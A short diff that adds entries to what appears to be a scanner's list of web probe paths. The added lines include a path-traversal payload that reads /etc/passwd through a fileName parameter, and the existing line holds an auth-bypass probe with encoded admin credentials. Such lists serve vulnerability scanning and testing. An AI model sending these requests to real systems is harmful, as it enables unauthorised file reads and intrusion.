@@ -1,1 +1,3 @@
 /system/deviceInfo?auth=YWRtaW46MTEK
+/php/ping.php
+/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd
